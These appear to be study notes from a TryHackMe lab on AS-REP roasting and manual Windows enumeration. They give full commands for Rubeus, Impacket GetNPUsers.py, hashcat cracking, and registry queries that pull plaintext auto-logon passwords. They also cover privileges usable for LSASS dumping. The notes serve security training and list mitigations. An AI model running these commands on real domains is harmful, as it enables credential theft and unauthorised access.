# AS-REP Roasting & Windows Manual Enumeration

---

## Part 1: AS-REP Roasting

### Overview

AS-REP Roasting targets user accounts that have **Kerberos pre-authentication disabled** (`UF_DONT_REQUIRE_PREAUTH` flag set). Unlike Kerberoasting, the target does not need to be a service account.

During normal Kerberos authentication, the user's hash encrypts a timestamp which the KDC decrypts to verify identity. If pre-authentication is disabled, the KDC skips this check and returns an encrypted AS-REP blob without verifying identity first. That blob can be captured and cracked offline.

Two phases: **Enumeration** (find vulnerable accounts) → **Exploitation** (crack the hash offline).

---

### Phase 1: Enumeration — Identifying Vulnerable Accounts

#### Rubeus (Windows only)

A Windows tool for Kerberos-related testing and enumeration. Automatically finds vulnerable accounts and retrieves AS-REP hashes.

```
Rubeus.exe asreproast
```

Scans Active Directory, identifies accounts with pre-authentication disabled, and retrieves crackable hashes.

#### Impacket's GetNPUsers.py (Linux/Windows)

A Python script for non-Windows environments. Requires a `users.txt` file of candidate usernames.

```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

| Flag | Meaning |
|------|---------|
| `tryhackme.loc/` | Target domain |
| `-dc-ip` | IP address of the Domain Controller |
| `-usersfile users.txt` | List of usernames to test |
| `-format hashcat` | Output format compatible with Hashcat |
| `-outputfile hashes.txt` | File to save retrieved hashes |
| `-no-pass` | Run without supplying a password (unauthenticated check) |

Enumerates each username in `users.txt`; for any account with pre-auth disabled, the AS-REP hash is captured and written to `hashes.txt`.

**Building the username list on the AttackBox:**

```bash
cat > users.txt
# paste usernames, then press Ctrl+D to save
cat users.txt   # verify contents
```

---

### Phase 2: Exploitation — Cracking the Hashes

#### Hashcat (cross-platform)

AS-REP hashes use Hashcat mode **18200**.

```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

| Part | Meaning |
|------|---------|
| `-m 18200` | AS-REP Kerberos hash cracking mode |
| `hashes.txt` | Captured hashes from Phase 1 |
| `wordlist.txt` | Dictionary of candidate passwords (e.g. `/usr/share/wordlists/rockyou.txt`) |

A successfully cracked hash reveals the plaintext password for that account, which can then be used to authenticate, request Kerberos tickets, or access other network resources.

---

### Mitigations

- Enforce Kerberos pre-authentication for all user accounts.
- Use strong, complex passwords to slow down offline cracking.
- Monitor for anomalous AS-REP requests at the KDC.

### Key Takeaways

- AS-REP Roasting is a low-noise, **unauthenticated** Kerberos attack.
- Rubeus simplifies discovery on Windows; `GetNPUsers.py` gives manual control elsewhere.
- Success depends on password strength and whether pre-auth is properly enforced.

---

## Part 2: Windows Manual Enumeration (Living Off the Land)

Using native CMD/PowerShell tools to enumerate identity, privileges, users, groups, sessions, services, and registry data — without dropping any external tools onto the host. Blends in with normal admin activity.

### Connecting to a Target Host

```bash
ssh <username>@<target_ip>
```

---

### Identity: Who Am I?

```cmd
whoami
```

Shows current domain/user context. `Domain\User` = domain account; `Computer\User` = local account.

```cmd
whoami /all
```

Returns:
- **User SID**
- **Group memberships** (e.g. local Administrators, Domain Users, Backup Operators)
- **Privileges** held by the current token

#### High-Value Privileges to Look For

| Privilege | Significance |
|-----------|---------------|
| `SeImpersonatePrivilege` | Allows impersonating other authenticated users' tokens — basis of "potato" privilege escalation attacks |
| `SeAssignPrimaryTokenPrivilege` | Assigns another user's primary token to a new process; used alongside `SeImpersonatePrivilege` |
| `SeBackupPrivilege` | Allows reading any file regardless of permissions — can be used to dump SAM/SYSTEM hives |
| `SeRestorePrivilege` | Allows writing to any file/registry key regardless of permissions — can overwrite critical system files |
| `SeDebugPrivilege` | Allows attaching a debugger to any process — enables LSASS memory dumping for credential theft |

---

### System & Domain Information

```cmd
hostname
```
Prints the computer's hostname (often hints at its role, e.g. `dc`, `pc01`).

```cmd
systeminfo
```
*(requires admin privileges)* — full OS version, hotfixes, domain/workgroup info.

```cmd
systeminfo | findstr /B "OS"
systeminfo | findstr /B "Domain"
```
Filters output to just OS version or domain membership.

```cmd
set
```
Lists environment variables (user home directory, domain, etc.). `USERDOMAIN` reflects the computer name unless domain-joined.

PowerShell equivalent:
```powershell
Get-ChildItem Env:
# or
dir env:
```

---

### Enumerating Users & Groups (NET commands)

`net` commands work from both CMD and PowerShell, and blend in with normal admin behavior.

```cmd
net help
```
Lists all available NET commands.

#### Domain Users

```cmd
net user /domain
```
Lists all domain user accounts (queries the DC — can be slow on large domains).

```cmd
net user <username> /domain
```
Returns full name, account status, password info, group memberships, and last logon time for a specific account.

#### Domain Groups

```cmd
net group /domain
```
Lists all domain groups.

**High-value groups to watch for:**
- `Domain Admins`, `Administrators` — full AD control
- `Enterprise Admins` — forest-wide control in multi-domain environments
- `Server Operators`, `Backup Operators` — privileged built-in groups
- Any group with **"Admin"** in the name (e.g. `SQL Admins`)

```cmd
net group "Domain Computers" /domain
```
Lists machine accounts in the domain (these end in `$`, e.g. `DESKTOP-ACCT05$`).

```cmd
net group "Domain Admins" /domain
```
Lists members of a specific domain group.

#### Local Groups

```cmd
net localgroup
```
Lists all local groups on the current machine.

```cmd
net localgroup administrators
```
Lists members of the local Administrators group (may reveal domain accounts/groups nested locally).

---

### Logged-On Users & Sessions

```cmd
quser
```
*(or `query user`)* — lists users currently logged onto the machine, their session type (console/RDP), state, and logon time.

> A privileged account (e.g. Administrator) logged in via RDP is a strong signal for credential theft via LSASS dumping or token impersonation, especially with `SeImpersonatePrivilege`.

```cmd
tasklist
tasklist /V
```
*(requires admin)* — lists running processes; `/V` adds verbose detail.

```cmd
net session
```
*(requires admin)* — lists active SMB sessions with other computers on the network.

**Indirect clue:** Folders under `C:\Users\` indicate every account that has logged on at least once.

---

### Identifying Service Accounts

Service accounts run applications/services, often with elevated but task-specific privileges, and typically use static, non-expiring passwords.

#### WMIC

```cmd
wmic service get Name,StartName
```
*(requires admin)* — lists each service and the account it runs under.

**Standard service accounts:** `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, `NT SERVICE\<ServiceName>`.
A **domain account** (`DomainName\username`) running a service is worth investigating — may be reused elsewhere or have a weaker password.

PowerShell equivalent:
```powershell
Get-WmiObject Win32_Service | select Name, StartName
```

#### SC (Service Control)

```cmd
sc query state= all
```
*(requires admin)* — lists all services and their state.

```cmd
sc query state= all | find "Keyword"
```
Filters for a specific service by keyword.

```cmd
sc qc <ServiceName>
```
Shows configuration detail for a specific service, including `SERVICE_START_NAME` (the account running it).

---

### Environment Variables & Registry

#### Saved Auto-Logon Credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```
If `AutoAdminLogon` is set to `1` and `DefaultPassword` exists, the credentials are stored in **plaintext**.

Related (admin-only, hashed credentials requiring cracking):
```
HKLM\Security\Cache
```

#### Installed Applications

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```
Lists installed applications — useful for spotting software with known default credentials.

#### Generic Registry Search

```cmd
reg query HKLM /f "password" /t REG_SZ /s
```
Searches the registry tree for a keyword (e.g. `password`) in string values.

---

### Scheduled Tasks

```cmd
schtasks /query
```
Lists all scheduled tasks.

```cmd
schtasks /create
schtasks /run
```
Creates or manually triggers a scheduled task (requires appropriate privileges).

---

## Tool & Command Summary

| Tool / Command | Purpose |
|----------------|---------|
| `Rubeus.exe asreproast` | AS-REP Roast enumeration (Windows) |
| `GetNPUsers.py` | AS-REP Roast enumeration (Impacket, cross-platform) |
| `hashcat -m 18200` | Crack AS-REP hashes offline |
| `whoami` / `whoami /all` | Identity, SID, group memberships, privileges |
| `hostname` | Computer hostname |
| `systeminfo` | Full system/domain detail |
| `set` / `Get-ChildItem Env:` | Environment variables |
| `net user /domain` | List domain users |
| `net user <user> /domain` | Detail on a specific domain user |
| `net group /domain` | List domain groups |
| `net group "<group>" /domain` | List members of a domain group |
| `net localgroup` | List local groups |
| `net localgroup administrators` | List local admins |
| `quser` | Logged-on users/sessions |
| `tasklist` | Running processes |
| `net session` | Active SMB sessions |
| `wmic service get Name,StartName` | Service accounts (CMD) |
| `Get-WmiObject Win32_Service` | Service accounts (PowerShell) |
| `sc query state= all` | List all services |
| `sc qc <service>` | Service configuration detail |
| `reg query ... Winlogon` | Check for saved auto-logon credentials |
| `reg query HKLM /f "password" /t REG_SZ /s` | Registry keyword search |
| `schtasks /query` | List scheduled tasks |

---

## Key Privilege Reference

| Privilege | Risk |
|-----------|------|
| `SeImpersonatePrivilege` | Token impersonation → SYSTEM shell ("potato" attacks) |
| `SeAssignPrimaryTokenPrivilege` | Assign another user's token to a new process |
| `SeBackupPrivilege` | Read any file, bypassing ACLs (SAM/SYSTEM hive dumping) |
| `SeRestorePrivilege` | Write any file/registry key, bypassing ACLs |
| `SeDebugPrivilege` | Attach to any process (LSASS dumping for credentials) |
